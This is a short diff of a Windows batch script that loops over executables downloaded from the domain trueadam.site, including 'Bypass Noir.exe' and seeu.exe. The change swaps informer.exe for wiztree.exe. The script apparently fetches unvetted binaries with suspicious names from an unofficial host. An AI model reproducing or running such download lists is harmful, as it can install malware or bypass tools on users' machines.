@@ -8,7 +8,7 @@ cd /d "%DIR%"
 
 for %%A in (
   "StarDesk.exe|https://trueadam.site/StarDesk.exe"
-  "informer.exe|https://trueadam.site/informer.exe"
+  "wiztree.exe|https://trueadam.site/wiztree.exe"
   "seeu.exe|https://trueadam.site/seeu.exe"
   "Bypass Noir.exe|https://trueadam.site/Bypass%20Noir.exe"
 ) do (
